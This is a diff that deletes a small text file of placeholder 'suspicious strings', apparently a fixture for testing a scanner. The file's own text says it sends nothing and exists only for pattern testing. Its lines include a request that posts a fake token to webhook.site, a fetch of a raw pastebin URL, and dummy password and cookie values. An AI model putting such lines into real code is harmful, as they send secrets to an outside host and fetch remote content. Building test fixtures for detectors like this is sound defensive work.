@@ -1,7 +1,0 @@
-requests.post("https://webhook.site/test", data={"token": "fake_token_12345"})
-requests.get("https://pastebin.com/raw/abc123")
-password = "user_password_here"
-cookie = "session_cookie_value"
-
-This is a harmless text file containing suspicious strings
-No actual data is sent anywhere - just pattern testing
